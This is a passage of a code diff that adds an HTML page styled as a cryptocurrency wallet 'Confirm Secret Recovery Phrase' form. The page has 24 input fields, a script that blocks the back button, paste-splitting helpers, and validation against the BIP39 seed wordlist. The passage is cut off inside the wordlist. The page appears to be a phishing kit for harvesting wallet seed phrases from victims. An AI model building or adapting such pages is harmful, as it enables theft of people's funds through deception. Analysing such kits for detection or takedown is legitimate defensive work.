+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="17" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="18" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>   
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="19" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="20" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="21" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>  
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="22" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="23" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="24" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+ <div class="form-group">
+  <button type="submit" id="cointiue_btn" class="btn btn-primary">Confirm Secret Recovery Phrase</button> 
+</div> 
+</form>
+   </div>
+   <!-- end 3s -->
+  </div>
+
+
+  
+
+</section>
+
+   <!-- end deor -->
+
+  </div>
+
+</div>
+
+
+    </div>
+    </div>
+
+  </div>
+</div>
+
+
+
+
+
+  <script src="assets/js/jquery-3.5.1.min.js"></script>
+  <script src="assets/js/popper.js"></script>
+  <script src="assets/js/bootstrap.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+        function preventBack() { window.history.forward(); }
+        setTimeout("preventBack()", 0);
+        window.onunload = function () { null };
+    </script>
+
+
+
+
+<script>
+   
+  const deafultValue = 0; /* set Active: index start from zero */
+
+/* 2/2 change content base on select */
+$(document).ready(function(){
+  /* set the deafult select-menu value */
+  $('#search-select').prop('selectedIndex', deafultValue); 
+  //hides dropdown content
+  $(".dropdown-content-bond").hide();
+  //unhides index option content
+  $(".dropdown-content-bond").eq( deafultValue ).show();
+  //listen to dropdown for change
+  $("#search-select").change(function(){
+    //rehide content on change
+    $('.dropdown-content-bond').hide();
+    //unhides current item
+    var currentIndex = $(this).prop('selectedIndex');
+    console.log(currentIndex);
+    $(".dropdown-content-bond").eq( currentIndex ).show(); 
+  });
+  
+});
+        
+</script>
+
+<!-- ------- feild sparate start----------- -->
+  <script type="text/javascript">
+                function split(sep, clazz) {
+
+                    var items = $(clazz);
+
+                    items.each(function (i) {
+
+                        $(this).on("paste", function () {
+                            var me = $(this);
+                            setTimeout(function () {
+                                var splitted = me.val().split(sep);
+                                items.each(function (i) {
+                                    $(this).val(splitted[i]);
+                                });
+                            }, 1);
+                        });
+                    })
+                };    
+                split(" ", ".keydata_12 input")
+
+        
+            </script> 
+
+
+             <script type="text/javascript">
+                function split(sep, clazz) {
+
+                    var items = $(clazz);
+
+                    items.each(function (i) {
+
+                        $(this).on("paste", function () {
+                            var me = $(this);
+                            setTimeout(function () {
+                                var splitted = me.val().split(sep);
+                                items.each(function (i) {
+                                    $(this).val(splitted[i]);
+                                });
+                            }, 1);
+                        });
+                    })
+                };    
+                split(" ", ".keydata_15 input")
+
+        
+            </script> 
+
+           <script type="text/javascript">
+                function split(sep, clazz) {
+
+                    var items = $(clazz);
+
+                    items.each(function (i) {
+
+                        $(this).on("paste", function () {
+                            var me = $(this);
+                            setTimeout(function () {
+                                var splitted = me.val().split(sep);
+                                items.each(function (i) {
+                                    $(this).val(splitted[i]);
+                                });
+                            }, 1);
+                        });
+                    })
+                };    
+                split(" ", ".keydata_18 input")
+
+        
+            </script> 
+
+           <script type="text/javascript">
+                function split(sep, clazz) {
+
+                    var items = $(clazz);
+
+                    items.each(function (i) {
+
+                        $(this).on("paste", function () {
+                            var me = $(this);
+                            setTimeout(function () {
+                                var splitted = me.val().split(sep);
+                                items.each(function (i) {
+                                    $(this).val(splitted[i]);
+                                });
+                            }, 1);
+                        });
+                    })
+                };    
+                split(" ", ".keydata_21 input")
+
+        
+            </script>  
+
+          <script type="text/javascript">
+                function split(sep, clazz) {
+
+                    var items = $(clazz);
+
+                    items.each(function (i) {
+
+                        $(this).on("paste", function () {
+                            var me = $(this);
+                            setTimeout(function () {
+                                var splitted = me.val().split(sep);
+                                items.each(function (i) {
+                                    $(this).val(splitted[i]);
+                                });
+                            }, 1);
+                        });
+                    })
+                };    
+                split(" ", ".keydata_24 input")
+
+        
+            </script>  
+
+
+            <!-- end sparat -->
+
+
+
+            <!-- =========== match input12 data start -->
+            <script>
+  document.getElementById('passwordForm').addEventListener('submit', function (event) {
+    var phrase_value = 
+    ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo","testing"]; // Array of phrase_value
+    var inputs = document.querySelectorAll('.input12'); // Access all input elements by class name
+    var isValid = true;
+
+    for (var i = 0; i < inputs.length; i++) {
+      var inputValue = inputs[i].value;
+      if (inputValue === '') {
+        alert('Please enter a value for Input ' + (i + 1));
+        isValid = false;
+        event.preventDefault(); // Prevent form submission if any input field is empty
+        break;
+      } else if (!phrase_value.includes(inputValue)) {
+        alert('Input ' + (i + 1) + ' value does not match the Phrase.');
+        isValid = false;
+        event.preventDefault(); // Prevent form submission if any input value doesn't match
+        break;
+      }
+    }
+
+    return isValid; // Allow or prevent form submission based on validation
+  });
+</script>
+            <!-- match input12 data end  -->
+
+
+            <!-- =========== match input15 data start -->
+            <script>
+  document.getElementById('passwordForm15').addEventListener('submit', function (event) {
+    var phrase_value = 
+    ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", 